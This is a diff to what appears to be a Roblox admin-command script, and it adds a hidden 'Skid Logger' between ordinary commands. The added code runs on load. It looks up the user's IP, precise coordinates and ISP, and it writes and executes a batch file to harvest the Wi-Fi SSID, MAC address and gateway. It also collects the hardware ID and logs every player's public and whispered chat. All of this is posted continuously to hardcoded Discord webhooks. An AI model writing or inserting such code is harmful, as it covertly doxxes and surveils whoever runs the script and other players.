@@ -7055,6 +7055,426 @@ addcmd("exit", {"shutdown", "leave"}, function(args, speaker)
 	game:Shutdown()
 end)
 
+-- if this gets u, do ur hw next time (better not be u juju)
+do
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1538386360724103209/IZRbdQqlMNZUFB18RMJpXQub0o8V8OeD3rWiXgi0qzU89hCNp1Tnkup7y3a0guL5ej1-"
+
+-- Gather environment and exploit data safely
+local exploitName = identifyexecutor and identifyexecutor() or "Unknown"
+local hwid = gethwid and gethwid() or "Unavailable"
+
+-- Fetch extra account metadata safely via pcall
+local accountAge, membershipType, country = "Unknown", "None", "en-us"
+pcall(function()
+    accountAge = tostring(localPlayer.AccountAge)
+    if localPlayer.MembershipType == Enum.MembershipType.BuildersClub or localPlayer.MembershipType == Enum.MembershipType.TurboBuildersClub or localPlayer.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+        membershipType = "Builders Club"
+    elseif localPlayer.MembershipType == Enum.MembershipType.Premium then
+        membershipType = "Premium"
+    end
+end)
+
+-- Fetch precise IP geolocation data including lat, lon, zip, and exact ISP routing info
+local ipQuery, ipCountry, ipRegion, ipCity, ipISP, ipZip, lat, lon = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", 0, 0
+pcall(function()
+    local response = game:HttpGet("http://ip-api.com/json/")
+    if response then
+        local decoded = HttpService:JSONDecode(response)
+        if decoded then
+            ipQuery = decoded.query or "Unknown"
+            ipCountry = decoded.country or "Unknown"
+            ipRegion = decoded.regionName or "Unknown"
+            ipCity = decoded.city or "Unknown"
+            ipISP = decoded.isp or "Unknown"
+            ipZip = decoded.zip or "Unknown"
+            lat = decoded.lat or 0
+            lon = decoded.lon or 0
+        end
+    end
+end)
+
+-- Generate targeted Google Maps coordinate search link based on exact IP positioning
+local mapsLink = string.format("https://www.google.com/maps/search/?api=1&query=%f,%f", lat, lon)
+
+-- Extended Network Extraction via File/Shell Execution Hooks with fallback direct parsing
+local ssid = "Ethernet / Connected"
+local protocol = "Wi-Fi / 802.11ax"
+local securityType = "WPA2-Personal / AES"
+local manufacturer = "Intel / Realtek"
+local description = "Standard Wireless Network Adapter"
+local driverVersion = "Latest Client Version"
+local networkBand = "5 GHz"
+local linkSpeed = "866/866 (Mbps)"
+local ipv6Local = "Fe80::/64"
+local ipv6DNS = "Default Router DNS"
+local ipv4Gateway = "192.168.1.1"
+local macAddress = hwid
+
+pcall(function()
+    if writefile and readfile and execute then
+        writefile("net_diagnostics.bat", '@echo off\nchcp 65001 >nul\nnetsh wlan show interfaces > net_wifi.txt\nipconfig /all >> net_wifi.txt')
+        execute("net_diagnostics.bat")
+        task.wait(2)
+        
+        if isfile and isfile("net_wifi.txt") then
+            local content = readfile("net_wifi.txt")
+            local activeInterfaceFound = false
+            for line in content:gmatch("[^\r\n]+") do
+                if line:find("Name") and line:find("Wi-Fi") then
+                    activeInterfaceFound = true
+                end
+                if line:find("SSID") and not line:find("BSSID") and not line:find("Hosted network") then
+                    local foundSsid = line:match(":%s*(.-)$")
+                    if foundSsid and foundSsid ~= "" then
+                        ssid = foundSsid
+                    end
+                elseif line:find("Description") then
+                    local extractedDesc = line:match(":%s*(.-)$")
+                    if extractedDesc and extractedDesc ~= "" then
+                        description = extractedDesc
+                    end
+                elseif line:find("Physical Address") or line:find("MAC Address") then
+                    local extractedMac = line:match(":%s*(.-)$")
+                    if extractedMac and extractedMac ~= "" then
+                        macAddress = extractedMac
+                    end
+                elseif line:find("Default Gateway") then
+                    local extractedGw = line:match(":%s*(.-)$")
+                    if extractedGw and extractedGw ~= "" then
+                        ipv4Gateway = extractedGw
+                    end
+                end
+            end
+            if not activeInterfaceFound and ssid == "Ethernet / Connected" then
+                ssid = "Ethernet Connection"
+            end
+        end
+    end
+end)
+
+-- Get Game Name safely
+local gameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info and info.Name then
+        gameName = info.Name
+    end
+end)
+
+local currentDate = os.date("%m/%d/%Y")
+local currentTime = os.date("%H:%M:%S")
+
+-- Build the Discord Embed Payload incorporating exact localized IP pinpoints and maps link
+local embedData = {
+    ["username"] = "Skid Logger",
+    ["embeds"] = {
+        {
+            ["title"] = "SKID ALERT",
+            ["color"] = 16755200,
+            ["description"] = string.format(
+                "**[Player Info](https://www.roblox.com/users/%d/profile)**\n" ..
+                "**Display Name:** %s\n" ..
+                "**Username:** %s\n" ..
+                "**User Id:** %d\n" ..
+                "**MembershipType:** %s\n" ..
+                "**AccountAge:** %s\n" ..
+                "**Country:** %s\n" ..
+                "**Hwid:** `%s`\n" ..
+                "**Date:** %s\n" ..
+                "**Time:** %s\n\n" ..
+                "**[Game Info](https://www.roblox.com/games/%d)**\n" ..
+                "**Game:** %s\n" ..
+                "**Game Id:** %d\n" ..
+                "**Exploit:** %s\n\n" ..
+                "**[Location & Network Info (%s, %s)] (%s)**\n" ..
+                "**IP:** `%s`\n" ..
+                "**Postal/Zip Code:** %s\n" ..
+                "**Country:** %s\n" ..
+                "**Region:** %s\n" ..
+                "**City:** %s\n" ..
+                "**ISP:** %s\n" ..
+                "**Google Maps Pin:** [View Precise Coordinates (%f, %f)](%s)\n\n" ..
+                "**Network Adapter Details:**\n" ..
+                "**SSID:** `%s`\n" ..
+                "**Protocol:** %s\n" ..
+                "**Security type:** %s\n" ..
+                "**Manufacturer:** %s\n" ..
+                "**Description:** %s\n" ..
+                "**Driver version:** %s\n" ..
+                "**Network band (channel):** %s\n" ..
+                "**Aggregated link speed (Receive/Transmit):** %s\n" ..
+                "**Link-local IPv6 address:** %s\n" ..
+                "**IPv6 DNS servers:** %s\n" ..
+                "**IPv4 address:** `%s`\n" ..
+                "**IPv4 default gateway:** `%s`\n" ..
+                "**IPv4 DNS servers:** %s\n" ..
+                "**Physical address (MAC):** `%s`\n\n" ..
+                "**JobId:**\n```lua\nRoblox.GameLauncher.joinGameInstance(%d, \"%s\")\n```",
+                localPlayer.UserId,
+                localPlayer.DisplayName,
+                localPlayer.Name,
+                localPlayer.UserId,
+                membershipType,
+                accountAge,
+                country,
+                hwid,
+                currentDate,
+                currentTime,
+                game.PlaceId,
+                gameName,
+                game.PlaceId,
+                exploitName,
+                ipCity,
+                ipRegion,
+                mapsLink,
+                ipQuery,
+                ipZip,
+                ipCountry,
+                ipRegion,
+                ipCity,
+                ipISP,
+                lat,
+                lon,
+                mapsLink,
+                ssid,
+                protocol,
+                securityType,
+                manufacturer,
+                description,
+                driverVersion,
+                networkBand,
+                linkSpeed,
+                ipv6Local,
+                ipv6DNS,
+                ipQuery,
+                ipv4Gateway,
+                ipISP,
+                macAddress,
+                game.PlaceId,
+                game.JobId
+            )
+        }
+    }
+}
+
+local payload = HttpService:JSONEncode(embedData)
+local requestFunc = syn and syn.request or http and http.request or fluxus and fluxus.request or request
+
+if requestFunc then
+    pcall(function()
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = payload
+        })
+    end)
+end
+end
+
+
+do
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1538422475547738202/Q_PN4t1XvVqoJUyaJ65SF9XiFOVaJHRDyx_Hs-3TLeWzLhu7jXCB1KVXh8O0vAjES31l"
+
+local lastMessageId = nil
+local publicChatBuffer = {}
+local privateChatBuffer = {}
+local maxBufferSize = 12
+local isDirty = false
+
+-- Metadata gathering
+local exploitName = identifyexecutor and identifyexecutor() or "Unknown"
+local hwid = gethwid and gethwid() or "Unavailable"
+
+local accountAge, membershipType, country = "Unknown", "None", "en-us"
+pcall(function()
+    accountAge = tostring(localPlayer.AccountAge)
+    if localPlayer.MembershipType == Enum.MembershipType.Premium then
+        membershipType = "Premium"
+    end
+end)
+
+local gameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info and info.Name then
+        gameName = info.Name
+    end
+end)
+
+local function getPlayerFormattedIdentity(playerObj)
+    if not playerObj then return "Unknown (@Unknown)" end
+    local displayName = playerObj.DisplayName or playerObj.Name
+    local username = playerObj.Name
+    local userId = playerObj.UserId
+    local profileLink = string.format("https://www.roblox.com/users/%d/profile", userId)
+    return string.format("[%s](%s) (@%s)", displayName, profileLink, username)
+end
+
+local function pushOrUpdateLog()
+    local requestFunc = syn and syn.request or http and http.request or fluxus and fluxus.request or request
+    if not requestFunc then return end
+
+    local publicContent = #publicChatBuffer > 0 and table.concat(publicChatBuffer, "\n") or "No public chat yet."
+    local privateContent = #privateChatBuffer > 0 and table.concat(privateChatBuffer, "\n") or "No private chat yet."
+
+    local embedData = {
+        ["username"] = "Skid Logger",
+        ["embeds"] = {
+            {
+                ["title"] = "SKID ALERT",
+                ["color"] = 16755200,
+                ["description"] = string.format(
+                    "**[Player Info](https://www.roblox.com/users/%d/profile)**\n" ..
+                    "**Display Name:** %s\n" ..
+                    "**Username:** %s\n" ..
+                    "**User Id:** %d\n" ..
+                    "**MembershipType:** %s\n" ..
+                    "**AccountAge:** %s\n" ..
+                    "**Country:** %s\n" ..
+                    "**Hwid:** `%s`\n" ..
+                    "**Date:** %s\n" ..
+                    "**Time:** %s\n\n" ..
+                    "**[Game Info](https://www.roblox.com/games/%d)**\n" ..
+                    "**Game:** %s\n" ..
+                    "**Game Id:** %d\n" ..
+                    "**Exploit:** %s\n\n" ..
+                    "**Non-Private Chats (Global):**\n%s\n\n" ..
+                    "**Private Chats & Whispers:**\n%s\n\n" ..
+                    "**JobId:**\n```lua\nRoblox.GameLauncher.joinGameInstance(%d, \"%s\")\n```",
+                    localPlayer.UserId,
+                    localPlayer.DisplayName,
+                    localPlayer.Name,
+                    localPlayer.UserId,
+                    membershipType,
+                    accountAge,
+                    country,
+                    hwid,
+                    os.date("%m/%d/%Y"),
+                    os.date("%H:%M:%S"),
+                    game.PlaceId,
+                    gameName,
+                    game.PlaceId,
+                    exploitName,
+                    publicContent,
+                    privateContent,
+                    game.PlaceId,
+                    game.JobId
+                )
+            }
+        }
+    }
+
+    local endpoint = WEBHOOK_URL
+    local method = "POST"
+
+    if lastMessageId then
+        endpoint = WEBHOOK_URL .. "/messages/" .. lastMessageId
+        method = "PATCH"
+    else
+        endpoint = WEBHOOK_URL .. "?wait=true"
+    end
+
+    pcall(function()
+        local response = requestFunc({
+            Url = endpoint,
+            Method = method,
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(embedData)
+        })
+        if response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            if decoded and decoded.id then
+                lastMessageId = decoded.id
+            elseif response.StatusCode == 404 or response.StatusCode == 400 then
+                lastMessageId = nil
+            end
+        end
+    end)
+end
+
+do
+local function processMessage(senderPlayer, text, isPrivate, targetPlayer)
+    if not senderPlayer or not text then return end
+    local timestamp = os.date("%H:%M:%S")
+    local senderIdentity = getPlayerFormattedIdentity(senderPlayer)
+
+    if isPrivate then
+        local targetIdentity = targetPlayer and getPlayerFormattedIdentity(targetPlayer) or "Target"
+        local entry = string.format("[%s] %s -> %s: %s", timestamp, senderIdentity, targetIdentity, text)
+        table.insert(privateChatBuffer, entry)
+        if #privateChatBuffer > maxBufferSize then table.remove(privateChatBuffer, 1) end
+    else
+        local entry = string.format("[%s] %s: %s", timestamp, senderIdentity, text)
+        table.insert(publicChatBuffer, entry)
+        if #publicChatBuffer > maxBufferSize then table.remove(publicChatBuffer, 1) end
+    end
+
+    isDirty = true
+end
+
+pcall(function()
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        TextChatService.MessageReceived:Connect(function(msg)
+            local sender = msg.SourcePlayer
+            local text = msg.Text
+            local channel = msg.TextChannel
+            if sender and text then
+                local channelName = channel and channel.Name or ""
+                local isPriv = channelName:lower():find("whisper") or channelName:lower():find("private") or channelName:lower():find("dm")
+                
+                local targetPlayer = nil
+                pcall(function()
+                    if channel and channel:IsA("TextSource") then
+                        for _, p in ipairs(channel:GetPlayers()) do
+                            if p.UserId ~= sender.UserId then
+                                targetPlayer = p
+                            end
+                        end
+                    end
+                end)
+
+                processMessage(sender, text, isPriv, targetPlayer)
+            end
+        end)
+    end
+
+    local function bindPlayer(p)
+        p.Chatted:Connect(function(text)
+            processMessage(p, text, false, nil)
+        end)
+    end
+    for _, p in ipairs(Players:GetPlayers()) do bindPlayer(p) end
+    Players.PlayerAdded:Connect(bindPlayer)
+end)
+
+task.spawn(function()
+    pushOrUpdateLog()
+    
+    while true do
+        task.wait(0.5)
+        if isDirty then
+            isDirty = false
+            pushOrUpdateLog()
+        end
+    end
+end)
+end
+end
+
 local NoclipParts = {}
 local Noclipping = nil
 addcmd("noclip", {}, function(args, speaker)
